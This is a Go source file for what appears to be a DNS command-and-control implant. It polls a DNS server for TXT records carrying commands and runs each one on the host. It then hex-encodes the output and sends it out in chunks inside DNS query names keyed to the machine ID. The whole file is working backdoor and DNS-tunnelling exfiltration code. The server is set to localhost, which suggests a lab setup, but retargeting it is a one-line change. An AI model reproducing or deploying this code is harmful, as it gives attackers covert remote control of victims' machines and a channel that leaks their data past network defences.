package main

import (
	"encoding/hex"
	"fmt"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/denisbrodbeck/machineid"
	"github.com/miekg/dns"
)

const (
	host      = "127.0.0.1:8053"
	maxMsgLen = 66
	delay     = 500 * time.Millisecond
)

func main() {
	machineId, _ := machineid.ID()
	var questionBeamUri = "0." + machineId + ".0.syl.sh."
	m := new(dns.Msg)
	m.SetQuestion(questionBeamUri, dns.TypeTXT)
	for {
		r, _ := dns.Exchange(m, host)
		if r != nil {
			for _, a := range r.Answer {
				if txt, ok := a.(*dns.TXT); ok {
					if txt.Txt[0] == "" {
						break
					}

					cmd := strings.Split(txt.Txt[0], " ")
					fmt.Printf("Recevied cmd: %s\n", cmd)
					nm := new(dns.Msg)
					out, _ := exec.Command(cmd[0], cmd[1:]...).CombinedOutput()

					chunkOutEnc := hex.EncodeToString(out)

					chunks := Chunks(chunkOutEnc, 63)
					for i, chunkOut := range chunks {
						chunkLen := strconv.Itoa(len(chunks))
						currentChunk := strconv.Itoa((i + 1))

						chunkUrl := currentChunk + "-" + chunkLen + "." + machineId + "." + chunkOut + ".sy1.sh."

						fmt.Println(chunkUrl)
						nm.SetQuestion(chunkUrl, dns.TypeA)
						dns.Exchange(nm, host)
					}
				}
			}
		}
		time.Sleep(delay)
	}
}

func Chunks(s string, chunkSize int) []string {
	if len(s) == 0 {
		return nil
	}
	if chunkSize >= len(s) {
		return []string{s}
	}
	var chunks []string = make([]string, 0, (len(s)-1)/chunkSize+1)
	currentLen := 0
	currentStart := 0
	for i := range s {
		if currentLen == chunkSize {
			chunks = append(chunks, s[currentStart:i])
			currentLen = 0
			currentStart = i
		}
		currentLen++
	}
	chunks = append(chunks, s[currentStart:])
	return chunks
}
